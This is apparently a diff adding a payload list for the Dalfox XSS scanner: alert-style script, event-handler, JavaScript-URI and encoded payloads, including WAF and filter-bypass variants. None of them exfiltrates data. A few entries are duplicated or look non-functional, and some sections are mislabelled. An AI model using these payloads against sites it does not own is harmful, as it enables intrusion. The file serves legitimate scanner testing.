@@ -1,0 +1,248 @@
+# Comprehensive XSS Payload List for Dalfox
+# Based on OWASP XSS Filter Evasion Cheat Sheet, PortSwigger, and common XSS patterns
+# This file is used by Dalfox for custom payload testing
+
+# Basic XSS Payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/)</script>
+
+# Image Tag XSS
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+
+# SVG XSS
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+
+# Body Tag XSS
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+
+# Input Tag XSS
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+
+# Iframe XSS
+<iframe src=javascript:alert(1)>
+<iframe onload=alert(1)>
+
+# Link/Anchor XSS
+<a href=javascript:alert(1)>click</a>
+<a href=javascript:void(0) onclick=alert(1)>click</a>
+<a href=# onclick=alert(1)>click</a>
+
+# Form XSS
+<form><button formaction=javascript:alert(1)>click</button></form>
+<form><input type=submit formaction=javascript:alert(1)>
+
+# Event Handler XSS
+<div onclick=alert(1)>click</div>
+<div onmouseover=alert(1)>hover</div>
+<div onfocus=alert(1) tabindex=0>focus</div>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+
+# JavaScript URI XSS
+javascript:alert(1)
+javascript:void(alert(1))
+javascript:alert(String.fromCharCode(88,83,83))
+javascript:alert(eval(String.fromCharCode(97,108,101,114,116,40,49,41)))
+
+# HTML Entity Encoding
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+
+# Mixed Case XSS
+<ScRiPt>alert(1)</ScRiPt>
+<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>
+
+# No Quotes XSS
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+# Double Quotes XSS
+<script>alert("XSS")</script>
+<img src="x" onerror="alert(1)">
+
+# Single Quotes XSS
+<script>alert('XSS')</script>
+<img src='x' onerror='alert(1)'>
+
+# Backtick XSS
+<script>alert(`XSS`)</script>
+<img src=x onerror=`alert(1)`>
+
+# Unicode Encoding
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert(1)</script>
+
+# Hex Encoding
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+
+# WAF Bypass - Polyglot Payloads
+<svg/onload=alert(1)>
+<svg/onload=alert`1`>
+<svg/onload=alert(1)//
+<svg/onload=alert(1)/*
+<svg/onload=alert(1)<!--
+
+# WAF Bypass - Obfuscated
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>Function('ale'+'rt(1)')()</script>
+<script>['alert'](1)</script>
+<script>window['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>frames['alert'](1)</script>
+
+# WAF Bypass - Tag Breaking
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=x onerror=alert(1)//
+<img src=x onerror=alert(1)/*
+<img src=x onerror=alert(1)<!--
+
+# DOM-based XSS
+#javascript:alert(1)
+#<script>alert(1)</script>
+?param=<script>alert(1)</script>
+#param=<script>alert(1)</script>
+
+# Template Literal XSS
+<script>alert`1`</script>
+<img src=x onerror=alert`1`>
+
+# Array-based XSS
+<script>[]['alert'](1)</script>
+<script>Array.prototype.alert=alert;[]['alert'](1)</script>
+
+# Function Constructor XSS
+<script>Function('alert(1)')()</script>
+<script>new Function('alert(1)')()</script>
+
+# setTimeout/setInterval XSS
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',1000)</script>
+
+# Location-based XSS
+<script>location='javascript:alert(1)'</script>
+<script>location.href='javascript:alert(1)'</script>
+<script>location.replace('javascript:alert(1)')</script>
+
+# Document Write XSS
+<script>document.write('<script>alert(1)</script>')</script>
+<script>document.writeln('<script>alert(1)</script>')</script>
+
+# InnerHTML XSS
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+
+# Eval XSS
+<script>eval('alert(1)')</script>
+<script>eval('ale'+'rt(1)')</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+# Expression-based XSS (IE)
+<div style="expression(alert(1))">test</div>
+<div style="x:expression(alert(1))">test</div>
+
+# CSS-based XSS
+<div style="background:url('javascript:alert(1)')">test</div>
+<div style="background:url(javascript:alert(1))">test</div>
+
+# Data URI XSS
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# Filter Bypass - No Spaces
+<script>alert(1)</script>
+<img/src=x/onerror=alert(1)>
+<svg/onload=alert(1)>
+
+# Filter Bypass - No Script Tag
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe onload=alert(1)>
+
+# Filter Bypass - Encoded
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+# Filter Bypass - Mixed Encoding
+<ScRiPt>alert(1)</ScRiPt>
+<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>
+
+# Advanced - Mutation XSS
+<svg><animatetransform onbegin=alert(1)>
+
+# Advanced - Namespace XSS
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+
+# Advanced - CDATA XSS
+<script><![CDATA[alert(1)]]></script>
+<script>/*alert(1)*/</script>
+
+# Advanced - Comment XSS
+<script><!--alert(1)//--></script>
+<script>/*alert(1)*/</script>
+
+# Advanced - Null Byte XSS
+<script>alert(1)%00</script>
+
+# Advanced - CRLF Injection XSS
+<script>alert(1)\r\n</script>
+
+# Advanced - UTF-7 XSS
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+# Advanced - Protocol Handler XSS
+javascript:alert(1)
+vbscript:alert(1)
+data:text/html,<script>alert(1)</script>
+
+# Advanced - Event Handler Variations
+<div onclick="alert(1)">click</div>
+<div onclick='alert(1)'>click</div>
+<div onclick=alert(1)>click</div>
+<div onclick=alert`1`>click</div>
+<div onclick=alert(String.fromCharCode(49))>click</div>
+
+# Advanced - Function Call Variations
+<script>alert(1)</script>
+<script>alert('1')</script>
+<script>alert("1")</script>
+<script>alert(`1`)</script>
+<script>alert(String.fromCharCode(49))</script>
+<script>alert(eval('1'))</script>
+
+# Advanced - Object Property Access
+<script>window.alert(1)</script>
+<script>top.alert(1)</script>
+<script>parent.alert(1)</script>
+<script>self.alert(1)</script>
+<script>frames.alert(1)</script>
+<script>globalThis.alert(1)</script>
+
+# Advanced - Array Access
+<script>window['alert'](1)</script>
+<script>window['ale'+'rt'](1)</script>
+<script>['alert'](1)</script>
+
+# Advanced - Constructor Access
+<script>Function('alert(1)')()</script>
+<script>new Function('alert(1)')()</script>
+<script>eval.constructor('alert(1)')()</script>
